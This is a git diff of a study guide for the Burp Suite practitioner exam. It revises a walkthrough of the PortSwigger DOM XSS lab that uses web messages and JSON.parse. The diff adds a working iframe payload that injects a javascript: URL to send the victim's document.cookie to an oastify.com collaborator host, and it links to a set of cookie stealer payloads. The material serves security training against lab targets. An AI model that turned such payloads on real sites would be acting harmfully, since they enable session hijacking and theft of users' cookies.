@@ -254,10 +254,22 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
   
 ### DOM XSS JSON.parse web messages    
 
->Target use web messaging and parses the message as JSON. Exploiting the vulnerability by constructing an HTML page on the exploit server that exploits DOM XSS vulnerability and steal victim cookie.  
+>Target use web messaging and parses the message as JSON.  
+>Exploiting the vulnerability by constructing an HTML page on the exploit server,  
+>that exploits DOM XSS vulnerability.  
 
+#### Requirements to steal cookie using this method: same-origin execution and non-HttpOnly cookies  
+#### What out for rabbit holes \o/  
 
->The vulnerable JavaScript code on the target using event listener that listens for a web message. This event listener expects a **string** that is parsed using **JSON.parse()**. In the JavaScript below, we can see that the event listener expects a **type** property and that the **load-channel** case of the **switch** statement changes the **img src** attribute.  
+>The vulnerable JavaScript code on the target using event listener that listens for a web message.  
+>This event listener expects a **string** that is parsed using **JSON.parse()**.  
+
+>Identify the `JSON.parse()` in page code:  
+
+![JSON_parse_web_messages.png](/images/JSON_parse_web_messages.png)  
+
+>In the JavaScript below, ***identify*** the event listener expects a **type** property  
+>and that the **load-channel** case of the **switch** statement changes the **img src** attribute.  
 
 >***Identify*** web messages on target that is using `postmessage()` with **DOM Invader**.  
 
@@ -290,21 +302,40 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 </script>
 ```  
 
->To exploit the above `source code`, inject JavaScript into the **JSON** data to change "load-channel" field data and steal document cookie.  
+>To exploit the above `source code`,  
+>inject JavaScript into the **JSON** data to change "load-channel" field data  
+>and perform cookie stealer `document.cookie`.  
   
->Host an **iframe** on the exploit server html body, and send it to the victim, resulting in the stealing of their cookie. The victim cookie is send to the Burp collaboration server.  
+>Host an **iframe** on the exploit server html body, and send it to the victim,  
+>resulting in the stealing of their cookie.  
+>***IF*** the site CORS policy is poorly configured, then if the session cookie flags are insecurely set, the victim session cookie could be stolen and send to the Burp collaboration server.  
 
 ```html
-<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
-    "type": "load-channel",
-    "url": "JavaScript:document.location='https://OASTIFY.COM?c='+document.cookie"
-}), "*");'>
-
+<iframe src="https://0a6800740474398f80cb03590060005e.web-security-academy.net/"
+        onload='this.contentWindow.postMessage(
+          JSON.stringify({
+            type: "load-channel",
+            url: "javascript:fetch(`https://tzwi4eohn1xy81l4n1bv40na016suii7.oastify.com/?c=`+encodeURIComponent(document.cookie))"
+          }), "*")'>
+</iframe>
 ```  
+
+![JSON_parse_web_messages_Exploit_server_Payload.png](/images/JSON_parse_web_messages_Exploit_server_Payload.png)  
 
 >At the end of the iframe onload values is a "*", this is to indicate the target is any.  
   
+>Set an unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS  
+>[cookie stealer payloads](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md).  
+
+```JavaScript
+document.cookie = "TopSecret=UnsecureCookieValue4Peanut2025";
+```  
+  
+![JSON_parse_web_messages_Exploit_server_cookie_steal_POC.png](/images/JSON_parse_web_messages_Exploit_server_cookie_steal_POC.png)  
+
 [PortSwigger Lab: DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)  
+
+>DOM Invader used to identify and Testing for DOM XSS using web messages  
 
 ![DOM Invader identify web messages](images/dom-invader-identify-web-messages.png)  
 
@@ -432,7 +463,7 @@ I am unable to get a working cookie stealer payload for this vulnerable lab.....
 
 + [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads)  
 
->Set a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS [cookie stealer payloads](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/5cbfeb2a11577ad62a31f72635a000bf5dcce293/payloads/CookieStealer-Payloads.md).  
+>Set a unsecured test cookie in browser using browser DEV tools console to use during tests for POC XSS [cookie stealer payloads](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md).  
 
 ```JavaScript
 document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
